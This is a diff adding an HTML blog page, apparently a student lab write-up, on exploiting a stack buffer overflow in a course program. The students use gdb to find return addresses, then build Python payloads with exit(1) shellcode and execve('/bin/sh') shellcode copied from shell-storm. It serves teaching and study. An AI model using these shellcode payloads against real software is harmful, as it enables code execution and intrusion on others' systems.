@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <link rel="icon" type="image/png" href="/sycasec/hackerman.jpg">
+    <title>
+Machine Problem 1 | Perez, Dy, del Castillo
+</title>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="generator" content="Hugo 0.122.0">
+
+
+<link rel="canonical" href="https://sycasec.github.io/sycasec/post/mp1/" >
+<link href="/sycasec/sass/main.min.509d45ddc02a9d663ac9bd60f6ba503ce71ee9454dd9faf2e760ad60cfcd1191.css" rel="stylesheet">
+</head>
+
+<body>
+    <div class="flexWrapper">
+        <header class="header">
+    <div class="wrapper">
+        <a href="https://sycasec.github.io/sycasec">
+            <span class="terminal">hello,friend@cybersec-blog ~ $</span>
+            <span class="cursor"></span>
+        </a>
+        <div class="menu">
+            <input type="checkbox" class="menu-toggle" id="menu-toggle" />
+            <nav class="menu-items">
+                <ul>
+                    
+                    
+                    <li>
+                     
+                      
+                      
+                        <a href="/sycasec/about"  title="" >
+                            ~/about</a>
+                    </li>
+                    
+                    <li>
+                     
+                      
+                      
+                        <a href="/sycasec/notes"  title="" >
+                            ~/notes</a>
+                    </li>
+                    
+                    <li>
+                     
+                      
+                      
+                        <a href="/sycasec/posts"  title="" >
+                            ~/posts</a>
+                    </li>
+                    
+                </ul>
+            </nav>
+            <label for="menu-toggle" class="menu-trigger">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M0 0h24v24H0z" fill="none" />
+                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+                </svg>
+            </label>
+        </div>
+    </div>
+</header>
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper post">
+    <h1>Machine Problem 1</h1>
+    <div class="postMeta">
+        
+        <span>February 22, 2024</span>
+        
+        
+    </div><h2 id="tldr">TL;DR</h2>
+<ul>
+<li><code>eip</code> upon entering <code>vuln()</code> is <code>0x56556183</code></li>
+<li>we break at <code>0x56556191</code> (<code>ret</code> from <code>vuln</code>) to observe behavior of <code>eip</code></li>
+<li>following the suggested information-giving commands in <code>gdb</code>, we get the desirable <code>esp</code> in vuln being <code>0xffffcde8</code>
+<ul>
+<li>we confirm this by defining <code>hook-stop</code> with <code>x/1i $eip</code> and <code>x/16wx $esp</code> which allows us to view the current instruction and the next 16 words in the stack every time execution is stopped</li>
+</ul>
+</li>
+<li>we try to craft the shell code</li>
+<li>compiling the given <code>asm</code> with necessary incantations fails</li>
+<li>we look for an exit one shell code in shell-storm</li>
+<li>we find that it has the exact same codes in as the ones already in the <code>mp1.pdf</code></li>
+<li>we finally craft shell code
+<ul>
+<li><code>\x41 * 12</code> for padding</li>
+<li><code>\xe8\xcd\xff\xff</code> redirecting our <code>eip</code></li>
+<li><code>\x31\xc0\x40\x89\xc3\xcd\x80</code> exit one shell code</li>
+</ul>
+</li>
+<li>we analyze exactly what the machine code does because we’re not script kiddies</li>
+<li>we try running <code>/bin/bash</code> with an <code>execve(&quot;/bin/bash&quot;)</code> shell code (ofc from shell-storm)</li>
+<li>$$$ profit</li>
+</ul>
+<p>exit one shell code full:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># we want to write past the sfp and change rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0xffffcdf8</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">ret_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_one</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x40\x89\xc3\xcd\x80</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">redirect</span> <span class="o">+</span> <span class="n">exit_one</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="know-thy-enemy">Know thy enemy</h2>
+<p>After compiling <code>vuln.c</code> with the necessary incantations, load its symbols into <code>gdb</code> with <code>gdb -q vuln</code>, and following through with the preliminary magicks required to peer into the heart of the code, most especially with <code>info frame</code>, we figure out that our <code>eip</code> has been yeeted into <code>0x56556183</code>, the current <code>esp</code> is at <code>0xffffcdf8</code>, and the current <code>ebp</code> is at <code>0xffffcdf0</code>. We also know from <code>print &amp;buffer</code> that it is stored at the location <code>0xffffcde8</code>, showing that the stack has allocated 8 bytes for <code>char buffer</code>. This will be important in our stack smashing endeavor.</p>
+<figure class="centered"><img src="infoframe.png" width="600"/><figcaption>
+            <h4>info_frame.png</h4>
+        </figcaption>
+</figure>
+
+<p>Lets take a deeper look at the <code>vuln()</code> by disassembling it with <code>disassemble vuln</code> in <code>gdb</code>:</p>
+<figure class="centered"><img src="disasvuln.png" width="500"/><figcaption>
+            <h4>disasvuln.png</h4>
+        </figcaption>
+</figure>
+
+<p>I assume that the arrow points towards where we set <code>break 1</code>, which is at the declaration of <code>char buffer[8]</code>.</p>
+<p>We want to change where our function returns, so lets take a look at what stored in <code>0x56556191</code> by setting a break point at that address (<code>break *0x56556191</code>). To gain more insight however, we need to look at our beginner’s book of spell analysis, famously called “<a href="https://ftp.gnu.org/old-gnu/Manuals/gdb/html_chapter/gdb_toc.html"><em>The Documentation</em></a>”.</p>
+<p>We have gleaned information from our guide that <code>x/1i $eip</code> allows us to print out the value of <code>eip</code> (what will be executed next), and lets also take a look at our stack with <code>x/16wx</code>, allowing us to see the next 18 words from where we currently are in the stack.</p>
+<p>A quick look at our guide tells us that we can automate this with a <code>hook</code>, which can be executed at certain points when running the program. <code>hook-stop</code> is particularly of interest, since it automatically executes whenever our program stops running in <code>gdb</code>, like hitting breakpoints. So here is what we’ve done so far:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> b *0x56556191
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> define hook-stop
+</span></span><span class="line"><span class="cl">&gt;x/1i <span class="nv">$eip</span>
+</span></span><span class="line"><span class="cl">&gt;x/16wx <span class="nv">$esp</span>
+</span></span><span class="line"><span class="cl">end
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we run the program again from the beginning, prompting us with the <code>gets()</code> function and for now we enter <code>ASD</code>. Our program stops at the return address, promptly showing the value of <code>eip</code> and the next 16 words in our stack.</p>
+<figure class="centered"><img src="hookstop.png" width="700"/><figcaption>
+            <h4>hookstop.png</h4>
+        </figcaption>
+</figure>
+
+<p>Going a single step with <code>si</code> shows us a jump from <code>0x56556191</code>  to <code>0x5655619a</code>, which is our <code>while(1){}</code> loop:</p>
+<figure class="centered"><img src="jumptowhile.png" width="700"/><figcaption>
+            <h4>jumptowhile.png</h4>
+        </figcaption>
+</figure>
+
+<p>While it doesn’t seem useful now, it is once we have crafted our payload. Speaking of which, lets do just that:</p>
+<h2 id="my-kung-fu-is-stronger-than-yours">My Kung Fu is stronger than yours</h2>
+<blockquote>
+<p>Your security technique will be defeated! - Zeke Shif, December 25 1994</p>
+</blockquote>
+<p>Lets sum up what we know:</p>
+<ul>
+<li><code>buffer</code>’s last byte is at <code>0xffffcde8</code></li>
+<li><code>vuln()</code>’s stack frame base pointer (<code>ebp</code>) is at <code>0xffffcdf0</code></li>
+<li>the <code>esp</code> for the current frame <code>0xffffcdf8</code></li>
+</ul>
+<p>The plan is to overflow <code>buffer</code>, write whatever into <code>sfp</code> and change <code>rip</code> to <code>esp</code>, so we <code>eip</code> pops that value and continues execution from there. Lets test that hypothesis  by creating our machine code payload. I really don’t wanna recite the <em>ancient rites of assembly incantations</em>, so lets just use our <em>Parseltongue</em> and summon the will of the snake (<code>python 3.11</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># we want to write past the sfp and change rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0xffffcdf8</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">ret_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And voila, we have written machine code payload into a file called <code>payload</code>. How very developer-like to name things the same thing. Anyway, <code>struct.pack</code> gives us a <code>bytes</code> type object in a certain format – which is <code>&quot;&lt;I&quot;</code> which is a little-endian byte order.</p>
+<p>Does that actually work? Lets find out (Haha did you get it? No? Okay, it was a stupid reference anyway):</p>
+<p>Lets load the <code>payload</code> into <code>vuln</code> with the command <code>r &lt; payload</code> and run the whole thing from the beginning. In theory, it should <em><strong>penetrate</strong></em> our stack so <strong>deep</strong> it <strong>fills up</strong> the <code>rip</code> with <em>something</em> (<code>0xffffcdf8</code>):</p>
+<figure class="centered"><img src="filluprip.png" width="700"/><figcaption>
+            <h4>filluprip.png</h4>
+        </figcaption>
+</figure>
+
+<p>This is our <code>ret</code> breakpoint, lets go one step from here with <code>si</code>:</p>
+<figure class="centered"><img src="singlestep.png" width="700"/><figcaption>
+            <h4>singlestep.png</h4>
+        </figcaption>
+</figure>
+
+<p>We did manage to <em><strong>penetrate and fill up</strong></em> our <code>rip</code> and control execution, but we’re missing one crucial thing for our payload. The shell code for <code>exit(1)</code>! Anyway, lets continue our current run first for educational purposes.</p>
+<figure class="centered"><img src="redir.png" width="700"/><figcaption>
+            <h4>redir.png</h4>
+        </figcaption>
+</figure>
+
+<p>So it gives us a <code>SIGILL</code>, probably because its doing something sinister, i dunno. Apparently the CPU dunno too so it just gives <code>SIGILL</code>. Anyway, lets do the shell code now. I tried just copying the assembly incantation from <code>mp1.pdf</code> but it doesn’t work for me, idk.</p>
+<p><figure class="centered"><img src="asm.png" width="400"/><figcaption>
+            <h4>asm.png</h4>
+        </figcaption>
+</figure>
+
+<figure class="centered"><img src="failure.png" width="600"/><figcaption>
+            <h4>failure.png</h4>
+        </figcaption>
+</figure>
+</p>
+<p>So lets copy it from <a href="https://shell-storm.org/shellcode/files/shellcode-55.html">somewhere online</a>. Thank you, Charles Stevenson!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* exit-core.c by Charles Stevenson &lt; core@bokeoa.com &gt;  
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * I made this as a chunk you can paste in to make modular remote
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * exploits.  I use it when I need a process to exit cleanly.
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">hellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="cm">/*  _exit(1); linux/x86 by core */</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 7 bytes _exit(1) ... &#39;cause we&#39;re nice &gt;:) by core
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s">&#34;</span><span class="se">\x31\xc0</span><span class="s">&#34;</span>              <span class="c1">// xor  %eax,%eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s">&#34;</span><span class="se">\x40</span><span class="s">&#34;</span>                  <span class="c1">// inc  %eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s">&#34;</span><span class="se">\x89\xc3</span><span class="s">&#34;</span>              <span class="c1">// mov  %eax,%ebx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="s">&#34;</span><span class="se">\xcd\x80</span><span class="s">&#34;</span>              <span class="c1">// int  $0x80
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shell</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">hellcode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d byte _exit(1); linux/x86 by core</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">         <span class="nf">strlen</span><span class="p">(</span><span class="n">hellcode</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">shell</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can just copy the machine code directly and plug it into our payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># we want to write past the sfp and change rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0xffffcdf8</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">ret_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_one</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x40\x89\xc3\xcd\x80</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">redirect</span> <span class="o">+</span> <span class="n">exit_one</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now lets regenerate payload with <code>python payload.py</code> and rerun <code>vuln</code> in `gdb</p>
+<figure class="centered"><img src="payload.png" width="600"/><figcaption>
+            <h4>payload.png</h4>
+        </figcaption>
+</figure>
+
+<p>And just like that, we can see the shell code being executed in (little-endian) order in the stack. However, let’s not be <em>script kiddies</em> and actually analyze what it does:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">118</span><span class="nl">a:</span> <span class="err">31</span> <span class="nf">c0</span> <span class="no">xor</span> <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span> <span class="c1">; set eax to 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">118</span><span class="nl">c:</span> <span class="err">40</span> <span class="nf">inc</span> <span class="nv">%eax</span>         <span class="c1">; incremenet eax by 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">118</span><span class="nl">d:</span> <span class="err">89</span> <span class="nf">c3</span> <span class="no">mov</span> <span class="nv">%eax</span><span class="p">,</span><span class="nv">%ebx</span> <span class="c1">; move eax into ebx (now ebx = 1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">118</span><span class="nl">f:</span> <span class="nf">cd</span> <span class="mi">80</span> <span class="no">int</span> <span class="no">$0x80</span>     <span class="c1">; trigger interrupt, invoke syscall (eax)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, I know I put comments, but just to make it clearer:</p>
+<ul>
+<li><code>\x31\xc0</code>: XORs the <code>eax</code> register with itself, effectively setting <code>eax</code> to 0.</li>
+<li><code>\x40</code>: Increments <code>eax</code> by 1, so <code>eax</code> becomes 1.</li>
+<li><code>\x89\xc3</code> passes exit code (<code>ebx=1</code>) to the <code>exit</code> syscall</li>
+<li><code>\xcd\x80</code>: Triggers an interrupt <code>0x80</code>, which is the Linux syscall interrupt. The value in <code>eax</code> determines which syscall to invoke. In this case, <code>eax</code> is set to 1 (the <code>exit</code> syscall number), so it invokes the <code>exit</code> syscall.</li>
+</ul>
+<h2 id="why-stop-there">Why stop there?</h2>
+<p>I mean we’re already here, lets run bash. We can do this with the <code>execve</code> command, with the input being <code>&quot;/bin/sh&quot;</code>. However, I really don’t wanna reinvent the wheel and make my own shell code from with assembly, so I’m gonna stand on the <a href="https://shell-storm.org/shellcode/files/shellcode-811.html"><em>shoulder of giants</em></a> (most especially, the giant named <strong>Jean Pascal Pereira</strong>. Whoever you are, thanks!):</p>
+<p>This assembly code is from the shell-storm link I carefully placed above:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">31</span> <span class="nf">c0</span>                 <span class="no">xor</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>          <span class="c1">; Clear eax register (set it to 0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">50</span>                    <span class="nf">push</span>   <span class="nv">%eax</span>               <span class="c1">; Push null byte onto the stack (used as a terminator)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">68</span> <span class="err">2</span><span class="nf">f</span> <span class="mi">2</span><span class="no">f</span> <span class="mi">73</span> <span class="mi">68</span>        <span class="no">push</span>   <span class="no">$0x68732f2f</span>        <span class="c1">; Push the string &#34;//sh&#34; onto the stack in reverse order
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">68</span> <span class="err">2</span><span class="nf">f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="no">e</span>        <span class="no">push</span>   <span class="no">$0x6e69622f</span>        <span class="c1">; Push the string &#34;nib/&#34; onto the stack in reverse order
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">89</span> <span class="nf">e3</span>                 <span class="no">mov</span>    <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ebx</span>          <span class="c1">; Move the address of the top of the stack (which now contains the &#34;/bin/sh&#34; string) into ebx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">89</span> <span class="nf">c1</span>                 <span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%ecx</span>          <span class="c1">; Move 0 (null) into ecx (will be used as the second argument to execve, argv)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">89</span> <span class="nf">c2</span>                 <span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%edx</span>          <span class="c1">; Move 0 (null) into edx (will be used as the third argument to execve, envp)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">b0</span> <span class="mi">0</span><span class="no">b</span>                 <span class="no">mov</span>    <span class="no">$0xb</span><span class="p">,</span><span class="nv">%al</span>           <span class="c1">; Move the syscall number for execve (11) into al
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">cd</span> <span class="mi">80</span>                 <span class="no">int</span>    <span class="no">$0x80</span>              <span class="c1">; Invoke the syscall (execve(&#34;/bin/sh&#34;, 0, 0))
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">31</span> <span class="nf">c0</span>                 <span class="no">xor</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>          <span class="c1">; Clear eax register (set it to 0)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">40</span>                    <span class="nf">inc</span>    <span class="nv">%eax</span>               <span class="c1">; Increment eax (set it to 1, which is the syscall exit number)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">cd</span> <span class="mi">80</span>                 <span class="no">int</span>    <span class="no">$0x80</span>              <span class="c1">; Invoke the syscall (exit)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>As usual, we analyze the assembly code to <em>not become script kiddies</em>. Now its just a matter of inserting the machine code in our python script, (we’re keeping the <code>exit_one</code> code though):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># we want to write past the sfp and change rip</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0xffffcdf8</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span> <span class="n">ret_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_one</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x40\x89\xc3\xcd\x80</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">redirect</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now lets rerun the entire thing:</p>
+<figure class="centered"><img src="bash.png" width="600"/><figcaption>
+            <h4>bash.png</h4>
+        </figcaption>
+</figure>
+
+<p>As we can see, we successfully executed a new program, <code>/usr/bin/bash</code>. A slight problem is that I cannot really execute this outside of gdb - it is due to Linux ASLR and probably memory padding, but that’s most likely outside the scope of this machine problem.</p>
+
+</div>
+
+            </main>
+        </div>
+        <footer class="footer">
+    &copy; 2024 Perez, Dy, del Castillo, Built with
+    <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+    <a href="https://github.com/akopdev/hugo-theme-rose-pine" class="footerLink">Rose Pine</a> theme
+</footer>
+
+
+    
+    <script src="/sycasec/js/copy-code.min.js"></script>
+
+
+    </div>
+</body>
+</html>
